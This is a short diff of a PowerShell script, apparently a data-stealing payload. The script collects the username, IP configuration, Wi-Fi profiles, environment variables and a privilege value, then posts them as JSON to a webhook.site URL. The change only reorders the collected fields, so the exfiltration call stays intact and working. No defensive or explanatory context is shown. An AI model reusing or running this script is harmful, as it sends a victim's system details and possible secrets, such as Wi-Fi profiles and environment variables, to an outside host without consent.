@@ -29,11 +29,11 @@ gci env:* | ForEach-Object {
 $priv = oneOfTheHardestThingsInCodingIsNamingThings
 $Body = @{
   'username' = $env:username
-  'wifi_profiles' = $wifis
   'ipv4' = $IPV4
+  'priv' = $priv
+  'wifi_profiles' = $wifis
   'ipconfig' = $IPconfig
   'env' = $envVars
-  'priv' = $priv
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
 
